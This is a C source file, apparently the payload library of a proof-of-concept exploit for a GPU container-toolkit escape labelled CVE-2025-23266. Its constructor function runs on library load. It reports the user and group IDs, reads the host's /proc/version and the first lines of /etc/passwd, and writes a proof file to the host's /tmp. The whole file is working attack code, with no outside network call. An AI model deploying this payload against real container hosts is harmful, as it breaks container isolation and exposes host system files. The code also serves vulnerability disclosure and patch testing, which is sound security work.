#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <string.h>
#include <time.h>

void __attribute__((constructor)) init() {
    printf("[PoC] NVIDIAscape CVE-2025-23266 Container Escape Triggered!\n");
    printf("[PoC] Running as UID: %d, GID: %d\n", getuid(), getgid());
    
    // Demonstrate host filesystem access
    FILE *f = fopen("/proc/version", "r");
    if (f) {
        char buffer[256];
        if (fgets(buffer, sizeof(buffer), f)) {
            printf("[PoC] Host kernel version: %s", buffer);
        }
        fclose(f);
    }
    
    // Try to read host /etc/passwd to prove escape
    f = fopen("/etc/passwd", "r");
    if (f) {
        printf("[PoC] Successfully accessed host /etc/passwd:\n");
        char line[256];
        int count = 0;
        while (fgets(line, sizeof(line), f) && count < 3) {
            printf("[PoC]   %s", line);
            count++;
        }
        printf("[PoC]   ... (truncated)\n");
        fclose(f);
    }
    
    // Create a file on the host to prove write access
    f = fopen("/tmp/nvidiascape_poc_success", "w");
    if (f) {
        fprintf(f, "Container escape successful via CVE-2025-23266\n");
        fprintf(f, "Timestamp: %ld\n", time(NULL));
        fclose(f);
        printf("[PoC] Created proof file: /tmp/nvidiascape_poc_success\n");
    }
    
    // Show current working directory context
    char cwd[1024];
    if (getcwd(cwd, sizeof(cwd))) {
        printf("[PoC] Current working directory: %s\n", cwd);
    }
    
    printf("[PoC] Container escape demonstration complete!\n");
}